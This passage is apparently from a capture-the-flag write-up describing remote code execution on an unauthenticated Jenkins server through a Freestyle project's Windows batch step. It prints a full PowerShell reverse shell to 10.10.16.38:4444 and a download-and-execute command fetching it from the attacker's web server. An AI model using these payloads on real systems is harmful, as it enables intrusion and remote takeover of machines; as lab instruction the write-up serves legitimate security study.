Luckily, this page doesn't require login to browse sensitive tabs. Also, it's well know that the jenkins has command execution functionality and CLI. Therefore, we woun't struggle to get reverse shell connection.

Pressing the tab New item show us several method to build project. We can ececute command from this interface. Enter name and select Freestyle project. Then, press OK button.

Though there are several way to get reverse shell with this functionality, this time I'll use little complex way for stable connection.

First, we need to prepare the file which include reverse shell command. Please replace your IP address. I named this file shell.ps1.

$client = New-Object System.Net.Sockets.TCPClient('10.10.16.38',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Then, we can trigger this code with command IEX.

Then, scroll donw the build page and select Execute Windows batch commnad, and enter command below

powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.16.38:8000/shell.ps1')

This command get string from our file shell.ps1, and evaluate it. Therefore, we can execute command of shell.ps1 with PowerShell.

After saving the project, open http server on where you have shell.ps1 file, and also open port for accepting reverse shell. Then, press Build Now.

Then we'll see HTTP GET request from target machine, and reverse shell connection soon.
